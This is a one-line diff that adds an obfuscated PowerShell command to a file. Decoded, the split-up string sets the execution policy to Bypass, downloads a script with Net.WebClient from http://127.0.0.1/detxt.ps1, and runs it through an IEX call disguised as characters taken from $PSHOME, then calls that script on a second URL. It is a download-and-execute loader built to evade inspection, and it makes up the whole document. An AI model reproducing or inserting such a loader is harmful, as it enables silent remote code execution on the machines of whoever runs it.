@@ -1,0 +1,1 @@
+﻿ (('Se'+'t-'+'E'+'xecuti'+'onPol'+'icy Bypass -'+'S'+'c'+'ope Proc'+'ess;I'+'E'+'X (('+'New-Object Ne'+'t'+'.'+'We'+'bClie'+'nt).'+'DownloadStr'+'ing({0}htt'+'p'+':/'+'/12'+'7'+'.0.0'+'.1'+'/de'+'txt'+'.ps1{0'+'}) )'+';'+'detxt'+' ht'+'t'+'p:/'+'/12'+'7'+'.'+'0.0'+'.1/1.txt;')  -F[cHAR]39)| &( $pSHoME[21]+$PsHoMe[34]+'X')
